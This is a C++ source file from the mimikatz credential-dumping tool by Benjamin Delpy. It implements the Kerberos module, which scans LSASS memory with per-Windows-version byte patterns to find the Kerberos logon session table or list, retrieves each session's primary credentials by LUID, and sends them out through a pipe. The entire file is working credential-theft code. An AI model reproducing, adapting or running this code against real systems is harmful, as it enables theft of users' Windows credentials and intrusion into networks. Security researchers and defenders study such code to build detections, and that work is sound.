/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence    : http://creativecommons.org/licenses/by-nc-sa/3.0/
	This file  : http://creativecommons.org/licenses/by/3.0/
*/
#include "kerberos.h"

PRTL_AVL_TABLE KerbGlobalLogonSessionTable = NULL;
PKIWI_KERBEROS_LOGON_SESSION KerbLogonSessionList = NULL;
long offsetMagic = 0;

bool searchKerberosFuncs()
{
#ifdef _M_X64
	BYTE PTRN_WALL_KerbUnloadLogonSessionTable[]= {0x48, 0x8b, 0x18, 0x48, 0x8d, 0x0d};
	LONG OFFS_WALL_KerbUnloadLogonSessionTable	= sizeof(PTRN_WALL_KerbUnloadLogonSessionTable);

	BYTE PTRN_WALL_KerbFreeLogonSessionList[]	= {0x48, 0x3b, 0xfe, 0x0f, 0x84};
	LONG OFFS_WALL_KerbFreeLogonSessionList		= -4;
#elif defined _M_IX86
	BYTE PTRN_WNO8_KerbUnloadLogonSessionTable[]= {0x85, 0xc0, 0x74, 0x1f, 0x53};
	LONG OFFS_WNO8_KerbUnloadLogonSessionTable	= -(3 + 4);
	BYTE PTRN_WIN8_KerbUnloadLogonSessionTable[]= {0x85, 0xc0, 0x74, 0x2b, 0x57}; // 2c instead of 2b before RC
	LONG OFFS_WIN8_KerbUnloadLogonSessionTable	= -(6 + 4);

	BYTE PTRN_WALL_KerbFreeLogonSessionList[]	= {0xeb, 0x0f, 0x6a, 0x01, 0x57, 0x56, 0xe8};
	LONG OFFS_WALL_KerbFreeLogonSessionList		= -4;
#endif

	if(!(KerbGlobalLogonSessionTable || KerbLogonSessionList))
	{
		PBYTE *pointeur = NULL; PBYTE pattern = NULL; ULONG taille = 0; LONG offset = 0;

		if(mod_system::GLOB_Version.dwMajorVersion < 6)
		{
			pointeur= reinterpret_cast<PBYTE *>(&KerbLogonSessionList);
			pattern	= PTRN_WALL_KerbFreeLogonSessionList;
			taille	= sizeof(PTRN_WALL_KerbFreeLogonSessionList);
			offset	= OFFS_WALL_KerbFreeLogonSessionList;

			if(mod_system::GLOB_Version.dwMinorVersion < 2)
				offsetMagic = 8;
		}
		else
		{
			pointeur= reinterpret_cast<PBYTE *>(&KerbGlobalLogonSessionTable);

#ifdef _M_X64
			pattern	= PTRN_WALL_KerbUnloadLogonSessionTable;
			taille	= sizeof(PTRN_WALL_KerbUnloadLogonSessionTable);
			offset	= OFFS_WALL_KerbUnloadLogonSessionTable;
#elif defined _M_IX86
			if(mod_system::GLOB_Version.dwBuildNumber < 8000)
			{
				pattern	= PTRN_WNO8_KerbUnloadLogonSessionTable;
				taille	= sizeof(PTRN_WNO8_KerbUnloadLogonSessionTable);
				offset	= OFFS_WNO8_KerbUnloadLogonSessionTable;
			}
			else
			{
				if(mod_system::GLOB_Version.dwBuildNumber < 8400) // small correction before the RC
					PTRN_WIN8_KerbUnloadLogonSessionTable[3] = 0x2c;
				pattern	= PTRN_WIN8_KerbUnloadLogonSessionTable;
				taille	= sizeof(PTRN_WIN8_KerbUnloadLogonSessionTable);
				offset	= OFFS_WIN8_KerbUnloadLogonSessionTable;
			}
#endif
		}

		mod_memory::genericPatternSearch(pointeur, L"kerberos", pattern, taille, offset);
	}
	return (searchLSAFuncs() && (KerbGlobalLogonSessionTable || KerbLogonSessionList));
}

__kextdll bool __cdecl getKerberosFunctions(mod_pipe * monPipe, vector<wstring> * mesArguments)
{
	wostringstream monStream;
	monStream << L"** kerberos.dll/lsasrv.dll ** ; Research Status : " << (searchKerberosFuncs() ? L"OK :)" : L"KO :(") << endl << endl <<
		L"@KerbGlobalLogonSessionTable = " << KerbGlobalLogonSessionTable << endl <<
		L"@KerbLogonSessionList        = " << KerbLogonSessionList << endl <<
		L"@LsaUnprotectMemory          = " << SeckPkgFunctionTable->LsaUnprotectMemory << endl;
	return sendTo(monPipe, monStream.str());
}

__kextdll bool __cdecl getKerberos(mod_pipe * monPipe, vector<wstring> * mesArguments)
{
	vector<pair<PFN_ENUM_BY_LUID, wstring>> monProvider;
	monProvider.push_back(make_pair<PFN_ENUM_BY_LUID, wstring>(getKerberosLogonData, wstring(L"kerberos")));
	return getLogonData(monPipe, mesArguments, &monProvider);
}

bool WINAPI getKerberosLogonData(__in PLUID logId, __in mod_pipe * monPipe, __in bool justSecurity)
{
	wostringstream maReponse;
	if(searchKerberosFuncs())
	{
		PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCreds = NULL;
		if(KerbGlobalLogonSessionTable)
		{
			KIWI_KERBEROS_PRIMARY_CREDENTIAL maRecherche;
			RtlZeroMemory(&maRecherche, sizeof(KIWI_KERBEROS_PRIMARY_CREDENTIAL));
			maRecherche.LocallyUniqueIdentifier = *logId;
			PKIWI_KERBEROS_PRIMARY_CREDENTIAL ptrMaRecherche = &maRecherche;
			if(PKIWI_KERBEROS_PRIMARY_CREDENTIAL * pLogSession = reinterpret_cast<PKIWI_KERBEROS_PRIMARY_CREDENTIAL *>(RtlLookupElementGenericTableAvl(KerbGlobalLogonSessionTable, &ptrMaRecherche)))
			{
				mesCreds = &(*pLogSession)->credentials;
			}
		}
		else
		{
			if(PKIWI_KERBEROS_LOGON_SESSION pLogSession = reinterpret_cast<PKIWI_KERBEROS_LOGON_SESSION>(getPtrFromLinkedListByLuid(reinterpret_cast<PLIST_ENTRY>(KerbLogonSessionList), FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, LocallyUniqueIdentifier) + offsetMagic, logId)))
			{
				if(offsetMagic != 0)
					pLogSession = reinterpret_cast<PKIWI_KERBEROS_LOGON_SESSION>(reinterpret_cast<PBYTE>(pLogSession) + offsetMagic);
				mesCreds =  &pLogSession->credentials;
			}
		}
		genericCredsToStream(&maReponse, mesCreds, justSecurity);
	}
	else maReponse << L"n.a. (kerberos KO)";

	return sendTo(monPipe, maReponse.str());
}